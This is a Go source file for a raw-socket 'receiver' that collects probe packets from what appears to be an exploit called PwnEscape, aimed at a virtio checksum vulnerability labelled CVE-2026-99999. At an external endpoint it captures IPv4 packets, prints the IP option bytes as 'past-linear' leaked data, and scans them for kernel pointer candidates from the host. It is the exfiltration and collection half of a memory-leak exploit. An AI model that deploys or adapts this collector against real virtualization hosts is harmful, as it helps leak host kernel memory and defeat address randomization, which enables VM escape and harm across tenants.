// receiver captures PwnEscape probe packets at a controlled external endpoint.
// It is intentionally passive: it never supplies virtio checksum metadata and
// therefore does not exercise CVE-2026-99999 on the collector host.
package main

import (
	"encoding/binary"
	"encoding/hex"
	"errors"
	"flag"
	"fmt"
	"net"
	"os"
	"os/signal"
	"syscall"
	"time"
)

const (
	ethLen     = 14
	vlanLen    = 4
	ethPAll    = 0x0003
	ethPIPv4   = 0x0800
	vlan8021Q  = 0x8100
	vlan8021AD = 0x88a8
	ipLen      = 20
	ipProtoTCP = 6
	ipProtoUDP = 17
	ipProtoRaw = 253
)

type config struct {
	iface    string
	udpPort  int
	tcpPort  int
	idBase   int
	idCount  int
	duration time.Duration
}

func main() {
	c := config{}
	flag.StringVar(&c.iface, "iface", "eth0", "interface to capture")
	flag.IntVar(&c.udpPort, "udp-port", 9, "PwnEscape UDP destination port")
	flag.IntVar(&c.tcpPort, "tcp-port", 443, "PwnEscape TCP destination port")
	flag.IntVar(&c.idBase, "id-base", 0x9999, "first expected IPv4 ID")
	flag.IntVar(&c.idCount, "id-count", 65536, "number of expected IPv4 IDs")
	duration := flag.Duration("duration", 0, "stop after this duration (zero waits for a signal)")
	flag.Parse()
	c.duration = *duration

	if os.Geteuid() != 0 {
		fmt.Fprintln(os.Stderr, "receiver must run as root or with CAP_NET_RAW")
		os.Exit(1)
	}
	if c.udpPort < 1 || c.udpPort > 65535 || c.tcpPort < 1 || c.tcpPort > 65535 || c.idBase < 0 || c.idBase > 65535 || c.idCount < 1 || c.idCount > 65536 {
		fmt.Fprintln(os.Stderr, "invalid UDP/TCP port or IPv4 ID range")
		os.Exit(1)
	}
	if err := capture(c); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}

func capture(c config) error {
	ifi, err := net.InterfaceByName(c.iface)
	if err != nil {
		return fmt.Errorf("interface %s: %w", c.iface, err)
	}
	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(ethPAll)))
	if err != nil {
		return fmt.Errorf("AF_PACKET socket: %w", err)
	}
	defer syscall.Close(fd)
	if err := syscall.Bind(fd, &syscall.SockaddrLinklayer{Protocol: htons(ethPAll), Ifindex: ifi.Index}); err != nil {
		return fmt.Errorf("bind %s: %w", c.iface, err)
	}
	_ = syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_RCVBUF, 16<<20)
	_ = syscall.SetsockoptTimeval(fd, syscall.SOL_SOCKET, syscall.SO_RCVTIMEO, &syscall.Timeval{Usec: 100000})

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, os.Interrupt, syscall.SIGTERM)
	defer signal.Stop(stop)
	var deadline time.Time
	if c.duration > 0 {
		deadline = time.Now().Add(c.duration)
	}

	fmt.Printf("receiver: iface=%s index=%d udp_port=%d tcp_port=%d id_base=0x%04x id_count=%d\n",
		ifi.Name, ifi.Index, c.udpPort, c.tcpPort, c.idBase, c.idCount)
	buf := make([]byte, 65536)
	seen := make(map[uint32]struct{})
	packets := 0
	ids := make(map[uint16]struct{})
	for {
		select {
		case <-stop:
			fmt.Printf("summary: packets=%d unique_ids=%d\n", packets, len(ids))
			return nil
		default:
		}
		if !deadline.IsZero() && time.Now().After(deadline) {
			fmt.Printf("summary: packets=%d unique_ids=%d\n", packets, len(ids))
			return nil
		}

		n, _, err := syscall.Recvfrom(fd, buf, 0)
		if err != nil {
			if errors.Is(err, syscall.EAGAIN) || errors.Is(err, syscall.EWOULDBLOCK) || errors.Is(err, syscall.EINTR) {
				continue
			}
			return fmt.Errorf("capture: %w", err)
		}
		ip := ipv4Of(buf[:n])
		if len(ip) < ipLen || ip[0]>>4 != 4 {
			continue
		}
		id := binary.BigEndian.Uint16(ip[4:6])
		if !idExpected(id, uint16(c.idBase), c.idCount) {
			continue
		}
		ihl := int(ip[0]&0x0f) * 4
		if ihl < ipLen || ihl > len(ip) {
			continue
		}
		frag := binary.BigEndian.Uint16(ip[6:8])
		offset := frag & 0x1fff
		more := frag&0x2000 != 0
		if !carrierExpected(ip, ihl, offset, c) {
			continue
		}

		key := uint32(id)<<16 | uint32(frag)
		if _, duplicate := seen[key]; duplicate {
			continue
		}
		seen[key] = struct{}{}
		packets++
		ids[id] = struct{}{}
		src := net.IP(ip[12:16])
		dst := net.IP(ip[16:20])
		fmt.Printf("packet: src=%s dst=%s id=0x%04x proto=%d first=0x%02x ihl=%d offset=%d more=%t bytes=%d\n",
			src, dst, id, ip[9], ip[0], ihl, offset*8, more, len(ip))
		if ihl > ipLen {
			options := ip[ipLen:ihl]
			fmt.Printf("  options hex=%s ascii=%q\n", hex.EncodeToString(options), string(options))
			if len(options) > 8 {
				leak := options[8:]
				fmt.Printf("  past-linear hex=%s ascii=%q\n", hex.EncodeToString(leak), string(leak))
				for _, candidate := range kernelPointerCandidates(leak) {
					fmt.Printf("  host-pointer-candidate offset=%d little=0x%016x\n", candidate.offset, candidate.value)
				}
			}
		}
	}
}

type kernelPointerCandidate struct {
	offset int
	value  uint64
}

func kernelPointerCandidates(data []byte) []kernelPointerCandidate {
	var out []kernelPointerCandidate
	for offset := 0; offset+8 <= len(data); offset++ {
		value := binary.LittleEndian.Uint64(data[offset : offset+8])
		if value>>48 == 0xffff && value&0x7 == 0 {
			out = append(out, kernelPointerCandidate{offset: offset, value: value})
		}
	}
	return out
}

func carrierExpected(ip []byte, ihl int, offset uint16, c config) bool {
	switch ip[9] {
	case ipProtoRaw:
		return true
	case ipProtoUDP:
		return offset != 0 || (len(ip) >= ihl+8 && int(binary.BigEndian.Uint16(ip[ihl+2:ihl+4])) == c.udpPort)
	case ipProtoTCP:
		return offset != 0 || (len(ip) >= ihl+20 && int(binary.BigEndian.Uint16(ip[ihl+2:ihl+4])) == c.tcpPort)
	default:
		return false
	}
}

func idExpected(id, base uint16, count int) bool {
	if count == 65536 {
		return true
	}
	return uint16(id-base) < uint16(count)
}

func ipv4Of(frame []byte) []byte {
	if len(frame) < ethLen {
		return nil
	}
	off := ethLen
	proto := binary.BigEndian.Uint16(frame[12:14])
	for proto == vlan8021Q || proto == vlan8021AD {
		if len(frame) < off+vlanLen {
			return nil
		}
		proto = binary.BigEndian.Uint16(frame[off+2 : off+4])
		off += vlanLen
	}
	if proto != ethPIPv4 || len(frame) < off+ipLen {
		return nil
	}
	return frame[off:]
}

func htons(v uint16) uint16 { return v<<8 | v>>8 }
